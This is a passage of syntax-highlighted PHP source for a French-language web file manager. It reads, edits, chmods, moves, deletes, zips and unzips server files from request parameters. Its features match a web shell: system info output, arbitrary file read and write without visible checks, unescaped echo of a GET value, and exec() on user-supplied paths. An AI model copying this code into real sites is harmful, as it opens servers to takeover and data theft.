	<span style="color: #19177C">$nomDossier</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&#39;/[^a-zA-Z0-9\/_-]/&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$nomDossier</span>);
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">file_exists</span>(<span style="color: #19177C">$nomDossier</span>)) {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Dossier existant&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">mkdir</span>(<span style="color: #19177C">$nomDossier</span>, <span style="color: #666666">0755</span>)) {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Ajout dossier réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">else</span> {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Ajout dossier échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
}
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">Créer un &lt;strong&gt;dossier&lt;/strong&gt; avec chemin absolu &lt;input type=&quot;text&quot; name=&quot;dossier&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #008000">realpath</span>(<span style="color: #19177C">$path</span>) <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;/nom-dossier/&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Enregistrer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&#39;</span>;

<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;creafichier&#39;</span>])) {
	<span style="color: #19177C">$creaFichier</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;creafichier&#39;</span>];
	<span style="color: #19177C">$creaFichier</span> <span style="color: #666666">=</span> <span style="color: #008000">str_replace</span>(<span style="color: #BA2121">&#39; &#39;</span>, <span style="color: #BA2121">&#39;_&#39;</span>, <span style="color: #19177C">$creaFichier</span>);
	<span style="color: #19177C">$creaFichier</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&#39;/[^a-zA-Z0-9\/\._-]/&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$creaFichier</span>);
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">file_exists</span>(<span style="color: #19177C">$creaFichier</span>)) {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Fichier existant&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000">file_exists</span>(<span style="color: #19177C">$creaFichier</span>)) {
		<span style="color: #19177C">$anse</span> <span style="color: #666666">=</span> <span style="color: #008000">fopen</span>(<span style="color: #19177C">$creaFichier</span>,<span style="color: #BA2121">&#39;c+&#39;</span>); <span style="color: #19177C">$ducontenu</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;Exemple de contenu&#39;</span>; <span style="color: #008000">fwrite</span>(<span style="color: #19177C">$anse</span>,<span style="color: #19177C">$ducontenu</span>); <span style="color: #008000">fclose</span>(<span style="color: #19177C">$anse</span>);
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Ajout fichier réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">else</span> {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Ajout fichier échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
}
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">Créer un &lt;em&gt;fichier&lt;/em&gt; avec chemin absolu &lt;input type=&quot;text&quot; name=&quot;creafichier&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #008000">realpath</span>(<span style="color: #19177C">$path</span>) <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;/fichier.txt&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Enregistrer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&#39;</span>;

<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;br&gt;&lt;br&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #008000">php_uname</span>() <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;</span>
<span style="color: #BA2121">&lt;/td&gt;&lt;/tr&gt;&#39;</span>;

<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>]) <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;telechargefichier&#39;</span>])) { telFichBin(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>]); }
<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>])) {
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt;Fichiers &gt;&gt; &quot;</span>;
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>];
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;&#39;</span>;
	<span style="color: #19177C">$ext_fich</span> <span style="color: #666666">=</span> substr(<span style="color: #008000">strrchr</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>],<span style="color: #BA2121">&#39;.&#39;</span>),<span style="color: #666666">1</span>);
	<span style="color: #19177C">$media_ext_liste</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(<span style="color: #BA2121">&#39;jpg&#39;</span>,<span style="color: #BA2121">&#39;png&#39;</span>,<span style="color: #BA2121">&#39;gif&#39;</span>,<span style="color: #BA2121">&#39;ico&#39;</span>,<span style="color: #BA2121">&#39;pdf&#39;</span>,<span style="color: #BA2121">&#39;mp3&#39;</span>,<span style="color: #BA2121">&#39;wav&#39;</span>,<span style="color: #BA2121">&#39;webp&#39;</span>,<span style="color: #BA2121">&#39;heic&#39;</span>,<span style="color: #BA2121">&#39;heif&#39;</span>,<span style="color: #BA2121">&#39;mp4&#39;</span>,<span style="color: #BA2121">&#39;mov&#39;</span>,<span style="color: #BA2121">&#39;hevf&#39;</span>,<span style="color: #BA2121">&#39;av1&#39;</span>);
	<span style="color: #19177C">$binaire_ext_liste</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(<span style="color: #BA2121">&#39;zip&#39;</span>,<span style="color: #BA2121">&#39;gz&#39;</span>,<span style="color: #BA2121">&#39;doc&#39;</span>,<span style="color: #BA2121">&#39;docx&#39;</span>,<span style="color: #BA2121">&#39;xls&#39;</span>,<span style="color: #BA2121">&#39;xlsx&#39;</span>,<span style="color: #BA2121">&#39;ppt&#39;</span>,<span style="color: #BA2121">&#39;pptx&#39;</span>,<span style="color: #BA2121">&#39;odt&#39;</span>,<span style="color: #BA2121">&#39;ods&#39;</span>,<span style="color: #BA2121">&#39;odp&#39;</span>,<span style="color: #BA2121">&#39;rtf&#39;</span>,<span style="color: #BA2121">&#39;pages&#39;</span>,<span style="color: #BA2121">&#39;numbers&#39;</span>,<span style="color: #BA2121">&#39;key&#39;</span>);
	<span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">in_array</span>(<span style="color: #19177C">$ext_fich</span> , <span style="color: #19177C">$media_ext_liste</span>)) { <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;p&gt;&lt;form method=&quot;POST&quot; action=&quot;?filesrc=&#39;</span><span style="color: #666666">.</span><span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>]<span style="color: #666666">.</span><span style="color: #BA2121">&#39;&amp;path=&#39;</span><span style="color: #666666">.</span><span style="color: #19177C">$path</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;&amp;telechargefichier=1&quot;&gt;&lt;input class=&quot;milieu&quot; type=&quot;submit&quot; value=&quot;Télécharger le fichier&quot;&gt;&lt;/form&gt;&lt;/p&gt;&lt;iframe class=&quot;milieu&quot; width=&quot;700&quot; height=&quot;700&quot; src=&quot;&#39;</span> <span style="color: #666666">.</span>cheminWeb(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>])<span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;&lt;/iframe&gt;&#39;</span>; }
	<span style="color: #008000; font-weight: bold">elseif</span>(<span style="color: #008000">in_array</span>(<span style="color: #19177C">$ext_fich</span> , <span style="color: #19177C">$binaire_ext_liste</span>)) { telFichBin(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>]); }
	<span style="color: #008000; font-weight: bold">else</span> {<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;p&gt;&lt;form method=&quot;POST&quot; action=&quot;?filesrc=&#39;</span><span style="color: #666666">.</span><span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>]<span style="color: #666666">.</span><span style="color: #BA2121">&#39;&amp;path=&#39;</span><span style="color: #666666">.</span><span style="color: #19177C">$path</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;&amp;telechargefichier=1&quot;&gt;&lt;input class=&quot;milieu&quot; type=&quot;submit&quot; value=&quot;Télécharger le fichier&quot;&gt;&lt;/form&gt;&lt;/p&gt;&lt;pre&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #008000">htmlspecialchars</span>(<span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;filesrc&#39;</span>])) <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/pre&gt;&#39;</span>;}
}
<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;option&#39;</span>]) <span style="color: #666666">&amp;&amp;</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;chmod&#39;</span><span style="color: #666666">||</span><span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;rename&#39;</span><span style="color: #666666">||</span><span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;move&#39;</span><span style="color: #666666">||</span><span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;edit&#39;</span>)) {
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/table&gt;&lt;p class=&quot;centre milieu&quot;&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;br&gt;&lt;br&gt;&#39;</span>;
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;chmod&#39;</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;perm&#39;</span>])) {
			<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">chmod</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>], octdec(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;perm&#39;</span>]))) {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Changer permission réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000; font-weight: bold">else</span> {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Changer permission échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
		}
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form class=&quot;centre milieu&quot; method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">Permission : &lt;input name=&quot;perm&quot; type=&quot;text&quot; size=&quot;4&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> substr(<span style="color: #008000">sprintf</span>(<span style="color: #BA2121">&#39;%o&#39;</span>, <span style="color: #008000">fileperms</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>])) , <span style="color: #666666">-4</span>) <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;opt&quot; value=&quot;chmod&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Enregistrer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;</span>
<span style="color: #BA2121">&lt;p class=&quot;centre&quot;&gt;ATTENTION, notation octale, entrer les 4 chiffres comme 0644 ou 0705.&lt;/p&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;rename&#39;</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;newname&#39;</span>])) {
			<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">rename</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>], <span style="color: #19177C">$path</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;/&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;newname&#39;</span>])) {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Changer nom réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000; font-weight: bold">else</span> {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Changer nom échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;name&#39;</span>] <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;newname&#39;</span>];
		}
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form class=&quot;centre milieu&quot; method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">Nouveau nom : &lt;input name=&quot;newname&quot; type=&quot;text&quot; size=&quot;30&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;name&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;opt&quot; value=&quot;rename&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Enregistrer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;move&#39;</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;deplace&#39;</span>])) {
			<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">rename</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>], <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;deplace&#39;</span>])) {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Déplacement du fichier réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000; font-weight: bold">else</span> {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Déplacement du fichier échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>] <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;deplace&#39;</span>];
		}
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form class=&quot;centre milieu&quot; method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">Déplacer le fichier vers : &lt;input name=&quot;deplace&quot; type=&quot;text&quot; size=&quot;30&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$path</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;/&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;name&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;opt&quot; value=&quot;move&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Enregistrer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;</span>
<span style="color: #BA2121">&lt;p class=&quot;centre&quot;&gt;ATTENTION, mettre le chemin absolu avec le nom du fichier ou du dossier.&lt;/p&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;edit&#39;</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;src&#39;</span>])) {
			<span style="color: #19177C">$fp</span> <span style="color: #666666">=</span> <span style="color: #008000">fopen</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>], <span style="color: #BA2121">&#39;w&#39;</span>);
			<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">fwrite</span>(<span style="color: #19177C">$fp</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;src&#39;</span>])) {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Modifier réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000; font-weight: bold">else</span> {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Modifier échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000">fclose</span>(<span style="color: #19177C">$fp</span>);
		}
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form class=&quot;centre milieu&quot; method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">&lt;textarea cols=80 rows=20 name=&quot;src&quot;&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #008000">htmlspecialchars</span>(<span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>])) <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/textarea&gt;&lt;br&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>] <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;hidden&quot; name=&quot;opt&quot; value=&quot;edit&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Enregistrer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/p&gt;&#39;</span>;
}
<span style="color: #008000; font-weight: bold">else</span> {
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/table&gt;&lt;br&gt;&lt;p class=&quot;milieu centre&quot;&gt;&#39;</span>;
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;option&#39;</span>]) <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;delete&#39;</span>) {
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;type&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;dir&#39;</span>) {
			<span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #008000; font-weight: bold">new</span> RecursiveIteratorIterator(<span style="color: #008000; font-weight: bold">new</span> RecursiveDirectoryIterator(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>], 
				FilesystemIterator<span style="color: #666666">::</span><span style="color: #7D9029">SKIP_DOTS</span> <span style="color: #666666">|</span> FilesystemIterator<span style="color: #666666">::</span><span style="color: #7D9029">UNIX_PATHS</span>), 
				RecursiveIteratorIterator<span style="color: #666666">::</span><span style="color: #7D9029">CHILD_FIRST</span>) <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$value</span>) {
				<span style="color: #19177C">$value</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">isFile</span>() <span style="color: #666666">?</span> <span style="color: #008000">unlink</span>(<span style="color: #19177C">$value</span>) <span style="color: #666666">:</span> <span style="color: #008000">rmdir</span>(<span style="color: #19177C">$value</span>);
			}
			<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">rmdir</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>])) {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Supprimer réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000; font-weight: bold">else</span> {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Supprimer échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
		}
		<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;type&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;file&#39;</span>) {
			<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">unlink</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>])) {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Supprimer fichier réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
			<span style="color: #008000; font-weight: bold">else</span> {
				<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Supprimer fichier échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
		}
	}
	<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;option&#39;</span>]) <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;zip&#39;</span>) {
		<span style="color: #19177C">$ficCompress</span> <span style="color: #666666">=</span> <span style="color: #008000">escapeshellcmd</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>]);
		<span style="color: #008000">exec</span>(<span style="color: #BA2121">&quot;zip -qr -6 &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$ficCompress</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;.zip &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$ficCompress</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;&quot;</span>);
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Compression réussie!&lt;/font&gt;&lt;br&gt;&#39;</span>;
		}
	<span style="color: #008000; font-weight: bold">elseif</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;option&#39;</span>]) <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;opt&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;unzip&#39;</span>) {
		<span style="color: #19177C">$extFic</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> SplFileInfo(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>]);
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$extFic</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getExtension</span>() <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;zip&#39;</span>) {
			<span style="color: #19177C">$ficCompress</span> <span style="color: #666666">=</span> <span style="color: #008000">escapeshellcmd</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;path&#39;</span>]);
			<span style="color: #008000">exec</span>(<span style="color: #BA2121">&quot;unzip -q &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$ficCompress</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot; -d &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$path</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;&quot;</span>);
			<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Décompression réussie!&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
		<span style="color: #008000; font-weight: bold">else</span> {
			<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Décompression échouée! Il faut un fichier ZIP&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
			}
		} 
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/p&gt;&#39;</span>;
